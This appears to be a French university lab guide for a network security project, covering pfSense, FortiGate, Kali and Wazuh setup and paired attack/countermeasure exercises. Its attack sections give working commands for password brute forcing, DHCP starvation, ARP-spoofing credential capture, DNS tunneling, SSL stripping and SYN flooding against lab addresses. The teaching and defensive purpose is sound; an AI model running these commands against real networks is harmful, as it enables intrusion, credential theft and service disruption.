# 🛡️ Mini-Projet — Sécurité des Réseaux & Cybersécurité
> **4ème Année Ingénieure | Dr. K. Zeraoulia**  
> **Durée : 60 jours | 70% pratique / 30% théorique**

---

## 📋 Table des matières

1. [Vue d'ensemble](#1-vue-densemble)
2. [Structure des équipes](#2-structure-des-équipes)
3. [Architecture réseau](#3-architecture-réseau)
4. [VMs à installer](#4-vms-à-installer)
5. [Configuration — Étapes complètes](#5-configuration--étapes-complètes)
6. [Attaques & Contre-mesures — Team 1](#6-attaques--contre-mesures--team-1-fg_server)
7. [Attaques & Contre-mesures — Team 2](#7-attaques--contre-mesures--team-2-fg_client)
8. [Wazuh SIEM — Installation & Détection](#8-wazuh-siem--installation--détection)
9. [Livrables attendus](#9-livrables-attendus)
10. [Tableau des IPs](#10-tableau-des-ips)

---

## 1. Vue d'ensemble

Ce projet reproduit une **infrastructure réseau d'entreprise réelle** sur VMware Workstation.  
Chaque membre installe et configure **son propre lab complet** sur son PC personnel.

> ⚠️ **Le VPN IPsec entre Team 1 et Team 2 ne peut pas être établi en vrai** (réseaux physiquement séparés).  
> Chacun configure sa moitié côté FortiGate et documente la config dans le rapport — c'est suffisant.

---

## 2. Structure des équipes

| Équipe | Membres | Composants |
|--------|---------|------------|
| **Team 1** | Islam, Chakib Graba, Hana, Naila | pfSense + **FG_SERVER** + LAN_SERVER |
| **Team 2** | Chakib Aitman, Hadil, Ihsan, Ramy | pfSense + **FG_CLIENT** + LAN_CLIENT |

> ℹ️ **FG_SERVER** (Team 1) = FortiGate qui protège des **serveurs** (NTP, services critiques)  
> ℹ️ **FG_CLIENT** (Team 2) = FortiGate qui protège des **postes clients/utilisateurs**  
> Ces deux rôles sont **différents** → les attaques et contre-mesures sont donc **différentes** aussi.

---

## 3. Architecture réseau

```
                    Internet (NAT VMware)
                           │
                           ▼
                ┌─────────────────────┐
                │      pfSense CE      │
                │  WAN(NAT) · LAN      │
                │  DNS · DHCP · LB     │
                └──────────┬──────────┘
                           │ VMnet2
                           ▼
                ┌─────────────────────┐
                │    FortiGate VM      │
                │  FG_SERVER (Team1)   │
                │  FG_CLIENT (Team2)   │
                │  port1←→pfSense      │
                │  port2←→LAN interne  │
                └──────────┬──────────┘
                           │ VMnet3
              ┌────────────┼────────────┐
              ▼            ▼            ▼
        ┌──────────┐ ┌──────────┐ ┌──────────┐
        │  Client  │ │  Kali    │ │  Wazuh   │
        │  LAN VM  │ │  Linux   │ │  SIEM    │
        └──────────┘ └──────────┘ └──────────┘

VPN IPsec IKEv2 : configuré localement sur FortiGate
                  (tunnel documenté dans le rapport)
```

> ⚠️ **Important :** Kali Linux est sur **VMnet3** (réseau interne).  
> Elle simule un **attaquant interne** au LAN.  
> Pour attaquer **pfSense directement**, ajouter une **2ème carte réseau à Kali sur VMnet2**.

---

## 4. VMs à installer

> Chaque membre installe toutes ces VMs sur **son propre PC**.

| # | VM | OS | RAM | Réseau VMware |
|---|----|----|-----|---------------|
| 1 | **pfSense** | pfSense CE 2.7 | 1 GB | WAN=NAT, LAN=VMnet2 |
| 2 | **FortiGate** | FortiGate VM64 eval | 2 GB | port1=VMnet2, port2=VMnet3 |
| 3 | **Client LAN** | Ubuntu / Windows | 1 GB | VMnet3 |
| 4 | **Kali Linux** | Kali 2024 | 2 GB | VMnet3 + VMnet2 *(2 cartes)* |
| 5 | **Wazuh SIEM** | Ubuntu Server 22.04 | 4 GB | VMnet3 |

> ⚠️ **Licence FortiGate VM eval = valide 15 jours seulement.**  
> Commence l'installation le plus tard possible avant la soutenance.  
> Téléchargement gratuit sur : https://support.fortinet.com (compte requis)

---

## 5. Configuration — Étapes complètes

### ÉTAPE 1 — Préparer VMware Workstation *(15 min)*

`VMware → Edit → Virtual Network Editor` :

| Réseau | Type | Sous-réseau |
|--------|------|-------------|
| **VMnet2** | Host-only | `10.0.2.0/24` (Team 1) ou `10.0.1.0/24` (Team 2) |
| **VMnet3** | Host-only | `192.168.2.0/24` (Team 1) ou `192.168.1.0/24` (Team 2) |
| **VMnet0** | NAT | déjà existant — WAN principal |
| **VMnet8** | NAT | WAN secondaire (pour Load Balancing) |

> ℹ️ Pour le **Load Balancing multi-ISP** : ajouter une 2ème carte NAT à pfSense.  
> VMware → VM Settings → **Add → Network Adapter → NAT (VMnet8)**

---

### ÉTAPE 2 — Installer pfSense *(45 min)*

1. Télécharge l'ISO : https://www.netgate.com/pfsense-plus-software/how-to-buy#trial
2. Crée la VM VMware : **1 GB RAM, 8 GB disque**
3. Ajoute **3 cartes réseau** :
   - Carte 1 → **NAT (VMnet0)** = WAN principal
   - Carte 2 → **NAT (VMnet8)** = WAN secondaire (Load Balancing)
   - Carte 3 → **VMnet2** = LAN
4. Lance l'installation → tout par défaut
5. À la fin, dans le menu pfSense console :
   - WAN → `DHCP` (automatique)
   - WAN2 → `DHCP` (automatique)
   - LAN → `10.0.2.1/24` *(Team 1)* ou `10.0.1.1/24` *(Team 2)*
6. Depuis une VM sur VMnet2, ouvre : `https://10.0.X.1`
   - Login : `admin` / `pfsense`

---

### ÉTAPE 3 — Configurer pfSense *(45 min)*

#### DNS Resolver
`Services → DNS Resolver`
```
✅ Enable DNS Resolver
✅ Listen on : LAN interface
✅ DNSSEC : Enable
```

#### DHCP Server
`Services → DHCP Server → LAN`
```
✅ Enable DHCP Server
Range     : 10.0.X.100 → 10.0.X.200
DNS Server: 10.0.X.1
Gateway   : 10.0.X.1
```

#### Load Balancing multi-ISP
`System → Routing → Gateway Groups → Add`
```
Nom          : ISP_Failover
WAN (VMnet0) : Tier 1   ← lien principal
WAN2(VMnet8) : Tier 2   ← lien de secours
Trigger Level: Packet Loss or High Latency
```
`Firewall → Rules → LAN` → modifier la règle par défaut :
```
Gateway : ISP_Failover  (au lieu de "default")
```

---

### ÉTAPE 4 — Installer FortiGate VM *(30 min)*

1. Télécharge le fichier `.ovf` sur https://support.fortinet.com
2. `VMware → File → Open` → importe le `.ovf`
3. Assigne les interfaces :
   - port1 → **VMnet2** (côté pfSense)
   - port2 → **VMnet3** (côté LAN interne)
4. Connexion initiale via console VMware :
```
login   : admin
password: (vide → appuie Entrée)
```
5. Configure les IPs via CLI :
```bash
config system interface
  edit port1
    set ip 10.0.2.2 255.255.255.0        # Team 2 : 10.0.1.2
    set allowaccess ping https ssh
  next
  edit port2
    set ip 192.168.2.1 255.255.255.0     # Team 2 : 192.168.1.1
    set allowaccess ping https ssh
  next
end
```
6. Route par défaut vers pfSense :
```bash
config router static
  edit 1
    set gateway 10.0.2.1                 # Team 2 : 10.0.1.1
    set device port1
  next
end
```

---

### ÉTAPE 5 — Configurer FortiGate Security Policies *(30 min)*

Interface web : `https://10.0.X.2`  
`Policy & Objects → Firewall Policy → Create New`

```
Name        : LAN_to_WAN
Incoming    : port2  (LAN interne)
Outgoing    : port1  (vers pfSense)
Source      : all
Destination : all
Service     : ALL
Action      : ACCEPT
NAT         : ✅ Enable
Logging     : ✅ Log All Sessions
```

---

### ÉTAPE 6 — Configurer VPN IPsec IKEv2 *(30 min)*

`VPN → IPsec Tunnels → Create New`

**Phase 1 :**
```
Name           : VPN_INTER_TEAMS
Remote Gateway : IP publique du partenaire (ou simulée)
Interface      : port1
IKE Version    : 2
Auth Method    : Pre-Shared Key
PSK            : SuperSecret123!
Encryption     : AES256
Integrity      : SHA256
DH Group       : 14
```

**Phase 2 :**
```
Local Subnet  : 192.168.2.0/24  (Team 1) | 192.168.1.0/24 (Team 2)
Remote Subnet : 192.168.1.0/24  (Team 1) | 192.168.2.0/24 (Team 2)
Encryption    : AES256
```

---

### ÉTAPE 7 — Tests & Captures d'écran *(30 min)*

Depuis la **VM Client** sur VMnet3 :
```bash
ping 192.168.X.1        # FortiGate port2
ping 10.0.X.1           # pfSense LAN
ping 8.8.8.8            # Internet via pfSense
nslookup google.com     # Test DNS
traceroute 8.8.8.8      # Vérifier le chemin
```

**Captures d'écran obligatoires :**
- [ ] Dashboard pfSense → DHCP Leases
- [ ] Dashboard pfSense → DNS Resolver actif
- [ ] pfSense → Routing → Gateway Groups (Load Balancing)
- [ ] FortiGate → Firewall Policies
- [ ] FortiGate → VPN IPsec config (Phase 1 & 2)
- [ ] Résultats des pings depuis Client VM
- [ ] Test basculement ISP (désactiver WAN1, vérifier WAN2 prend le relai)

---

### ÉTAPE 8 — Installer Wazuh SIEM *(45 min)*

Sur la VM **Ubuntu Server 22.04** (VMnet3) :

```bash
# Téléchargement et installation automatique
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
sudo bash wazuh-install.sh -a

# À la fin, noter le mot de passe généré
# Interface web : https://IP_UBUNTU_WAZUH:443
# Login : admin / <mot_de_passe_généré>
```

**Connecter pfSense à Wazuh (syslog) :**  
`pfSense → Status → System Logs → Settings`
```
Enable Remote Logging : ✅
Remote Syslog Server  : IP_WAZUH:514
```

**Connecter FortiGate à Wazuh (syslog) :**
```bash
config log syslogd setting
  set status enable
  set server IP_WAZUH
  set port 514
end
```

---

## 6. Attaques & Contre-mesures — Team 1 (FG_SERVER)

> 🎯 **Cible : serveurs critiques (NTP, DNS, SSH, services LAN_SERVER)**  
> Kali Linux est sur VMnet3. Ajouter une carte VMnet2 à Kali pour attaquer pfSense directement.

---

### Attaque 1 — Reconnaissance serveurs
```bash
# Découverte du réseau
nmap -sn 10.0.2.0/24

# Scan ports pfSense et FG_SERVER
nmap -sV -p- 10.0.2.1
nmap -sV -p- 10.0.2.2

# Détection OS
nmap -O 10.0.2.2

# Services critiques dans LAN_SERVER
nmap -p 22,80,443,123,53 192.168.2.0/24
```

---

### Attaque 2 — NTP Amplification *(spécifique FG_SERVER = serveur NTP)*
```bash
# Vérifier si NTP répond
nmap -sU -p 123 10.0.2.2

# Test amplification NTP
nmap -sU -p 123 --script ntp-monlist 10.0.2.2
ntpq -p 10.0.2.2
```
> 🟢 **Contre-mesure :** Ajouter dans config NTP de FG_SERVER :
> `restrict default noquery nomodify notrap nopeer`

---

### Attaque 3 — DNS Zone Transfer *(pfSense DNS Resolver)*
```bash
# Tenter de récupérer tous les enregistrements DNS
dig axfr @10.0.2.1
dnsenum 10.0.2.1
dnsrecon -d local.lan -n 10.0.2.1
```
> 🟢 **Contre-mesure :** pfSense → DNS Resolver → désactiver AXFR  
> (Allow Zone Transfers → None)

---

### Attaque 4 — Brute Force admin *(pfSense + FG_SERVER)*
```bash
# pfSense HTTPS
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  10.0.2.1 https-post-form \
  "/index.php:username=^USER^&password=^PASS^:Login failed"

# FG_SERVER SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  ssh://10.0.2.2
```
> 🟢 **Contre-mesure :** pfSense → System → Advanced → Admin Access  
> → Max login attempts : 5 → Lockout duration : 1800s

---

### Attaque 5 — Exploitation services LAN_SERVER
```bash
# Scanner vulnérabilités des serveurs
nmap --script vuln 192.168.2.0/24
nikto -h https://10.0.2.1

# Metasploit — version SSH
msfconsole -q
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.2.0/24
run
```
> 🟢 **Contre-mesure :** Mettre à jour les services, désactiver les ports inutiles  
> FortiGate IPS → activer signatures "Server Protection"

---

### Attaque 6 — Test VPN IPsec *(FG_SERVER)*
```bash
# Ports IPsec
nmap -sU -p 500,4500 10.0.2.2

# Test config IKE
ike-scan 10.0.2.2
ike-scan --aggressive 10.0.2.2
```
> 🟢 **Contre-mesure :** Désactiver IKEv1, forcer IKEv2 uniquement. PFS obligatoire.

---

### Attaque 7 — Scan vulnérabilités global
```bash
nmap --script vuln 10.0.2.0/24
nikto -h https://10.0.2.1
```

---

### 📋 Résumé contre-mesures Team 1

| Attaque | Contre-mesure |
|---------|---------------|
| NTP Amplification | `restrict default noquery` sur FG_SERVER |
| DNS Zone Transfer | Désactiver AXFR sur pfSense DNS Resolver |
| Brute Force | Lockout 5 tentatives pfSense + FortiGate |
| Scan Nmap | IPS FortiGate → signature "Port Scan" |
| Exploit services | Patch + désactiver services inutiles |
| VPN faible | Forcer IKEv2 + AES256 + PFS Group 14 |

---

## 7. Attaques & Contre-mesures — Team 2 (FG_CLIENT)

> 🎯 **Cible : postes clients/utilisateurs, DHCP, Web Filter, trafic LAN_CLIENT**  
> Kali Linux est sur VMnet3. Ajouter une carte VMnet2 à Kali pour attaquer pfSense directement.

---

### Attaque 1 — Reconnaissance clients
```bash
# Découverte réseau
nmap -sn 10.0.1.0/24
netdiscover -r 192.168.1.0/24
arp-scan -l

# Scan pfSense et FG_CLIENT
nmap -sV -p- 10.0.1.1
nmap -sV -p- 10.0.1.2
```

---

### Attaque 2 — DHCP Starvation *(spécifique FG_CLIENT = côté clients)*
```bash
# Installer yersinia
apt install yersinia -y

# Épuiser tout le pool DHCP → les clients n'ont plus d'IP
yersinia dhcp -attack 1

# Rogue DHCP → faux serveur DHCP
# Les clients reçoivent une fausse gateway → trafic redirigé vers Kali
yersinia dhcp -attack 2
```
> 🟢 **Contre-mesures :**
> - pfSense → DHCP Server → Max leases per MAC : 1
> - FortiGate → activer DHCP Snooping sur port2
> - N'autoriser DHCP que depuis FG_CLIENT

---

### Attaque 3 — ARP Spoofing MITM *(LAN CLIENT)*
```bash
# Activer le forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP poisoning (victime = 192.168.1.100, gateway = FG_CLIENT)
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# Capturer credentials des utilisateurs
ettercap -T -q -i eth0
wireshark &
```
> 🟢 **Contre-mesure :** FortiGate → activer **Dynamic ARP Inspection (DAI)**  
> sur l'interface port2 (LAN CLIENT)

---

### Attaque 4 — Bypass Web Filter *(spécifique FG_CLIENT)*
```bash
# DNS alternatif pour contourner le filtrage
nslookup blocked-site.com 8.8.8.8

# Tunneling DNS (bypass total)
apt install iodine -y
iodine -f 8.8.8.8 tunnel.test.com

# SSL Stripping → intercepter HTTPS
apt install sslstrip -y
sslstrip -l 8080
```
> 🟢 **Contre-mesures :**
> - FortiGate → bloquer DNS vers serveurs externes (port 53 sortant bloqué sauf pfSense)
> - FortiGate → activer TLS/SSL Deep Inspection
> - Bloquer iodine et outils de tunneling via App Control

---

### Attaque 5 — Load Balancer DoS *(pfSense multi-ISP)*
```bash
# Saturer les 2 liens ISP pfSense
hping3 -S --flood -V 10.0.1.1

# Vérifier si le basculement ISP se déclenche incorrectement
# Observer dans pfSense → Status → Gateways
```
> 🟢 **Contre-mesure :** pfSense → Firewall → Rules → Rate Limiting  
> Limiter le nombre de connexions par IP source

---

### Attaque 6 — Brute Force admin *(pfSense + FG_CLIENT)*
```bash
# pfSense HTTPS
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  10.0.1.1 https-post-form \
  "/index.php:username=^USER^&password=^PASS^:Login failed"

# FG_CLIENT SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  ssh://10.0.1.2
```
> 🟢 **Contre-mesure :** Lockout après 5 tentatives sur pfSense et FortiGate

---

### Attaque 7 — Scan vulnérabilités global
```bash
nmap --script vuln 10.0.1.0/24
nikto -h https://10.0.1.1
```

---

### 📋 Résumé contre-mesures Team 2

| Attaque | Contre-mesure |
|---------|---------------|
| DHCP Starvation | Max 1 lease par MAC + DHCP Snooping |
| Rogue DHCP | Autoriser DHCP depuis FG_CLIENT uniquement |
| ARP Spoofing | Dynamic ARP Inspection sur port2 FortiGate |
| Web Filter Bypass | Bloquer DNS ext. + TLS Inspection + App Control |
| Load Balancer DoS | Rate limiting pfSense |
| Brute Force | Lockout 5 tentatives pfSense + FortiGate |

---

## 8. Wazuh SIEM — Installation & Détection

### Règles de détection à créer

| Événement | Source log | Action Wazuh |
|-----------|-----------|--------------|
| Brute force SSH/HTTPS | FortiGate syslog | Alerte critique si > 5 échecs / 1 min |
| Scan Nmap détecté | pfSense log | Alerte haute |
| DHCP Starvation | pfSense DHCP log | Alerte critique |
| ARP Spoofing | FortiGate log | Alerte critique |
| Connexion VPN inhabituelle | FortiGate VPN log | Alerte moyenne |
| Accès admin hors heures | FortiGate admin log | Alerte haute |

### Test de détection depuis Kali
```bash
# Déclencher une alerte brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.X.1

# Déclencher une alerte scan
nmap -sV 10.0.X.0/24

# Vérifier dans Wazuh Dashboard que les alertes apparaissent
```

---

## 9. Livrables attendus

| Phase | Livrable | Format |
|-------|---------|--------|
| Phase 1 | Rapport documentation + audit initial | PDF (15-20 pages) |
| Phase 1 | Soutenance orale | Présentation 15 min |
| Phase 2 | Schéma VLAN + politiques documentées | draw.io + Word |
| Phase 2 | Soutenance orale + démo HA live | Présentation 20 min |
| Phase 3 | Rapport pentest complet + remédiation | PDF (20-30 pages) |
| Phase 3 | Soutenance pentest | Présentation 25 min |
| Phase 4 | Dashboard SOC + règles Wazuh | Captures + export |
| Phase 4 | Playbooks IR (3 scénarios) | Word / Notion |
| Phase 4 | Rapport final toutes phases | PDF (40+ pages) |
| Phase 4 | Soutenance finale + démo live | Présentation 45 min |

---

## 10. Tableau des IPs

| Élément | Team 1 (FG_SERVER) | Team 2 (FG_CLIENT) |
|---------|--------------------|--------------------|
| pfSense LAN | `10.0.2.1/24` | `10.0.1.1/24` |
| pfSense DHCP range | `10.0.2.100 – 10.0.2.200` | `10.0.1.100 – 10.0.1.200` |
| FortiGate port1 (WAN) | `10.0.2.2/24` | `10.0.1.2/24` |
| FortiGate port2 (LAN) | `192.168.2.1/24` | `192.168.1.1/24` |
| FortiGate nom | `FG_SERVER` | `FG_CLIENT` |
| LAN interne | `192.168.2.0/24` | `192.168.1.0/24` |
| VPN local subnet | `192.168.2.0/24` | `192.168.1.0/24` |
| VPN remote subnet | `192.168.1.0/24` | `192.168.2.0/24` |
| Kali Linux | `192.168.2.50` + `10.0.2.50` | `192.168.1.50` + `10.0.1.50` |
| Wazuh SIEM | `192.168.2.10` | `192.168.1.10` |

---

## ⚡ Corrections apportées par rapport aux docs originaux

| # | Problème original | Correction apportée |
|---|-------------------|---------------------|
| 1 | Wazuh absent des étapes d'install | ✅ Étape 8 ajoutée complète |
| 2 | Load Balancing : 2ème carte NAT non expliquée | ✅ VMnet8 ajouté dans Étape 1 |
| 3 | Kali sur VMnet3 ne voit pas pfSense | ✅ 2ème carte VMnet2 ajoutée à Kali |
| 4 | Licence FortiGate 15j non mentionnée | ✅ Avertissement ajouté |
| 5 | Attaques identiques pour les 2 teams | ✅ Attaques séparées selon FG_SERVER / FG_CLIENT |
| 6 | IPs Kali non définies | ✅ IPs fixes assignées à Kali et Wazuh |

---

*Document rédigé pour usage pédagogique interne — Sécurité des Réseaux & Cybersécurité*  
*4ème Année Ingénieure | Dr. K. Zeraoulia*
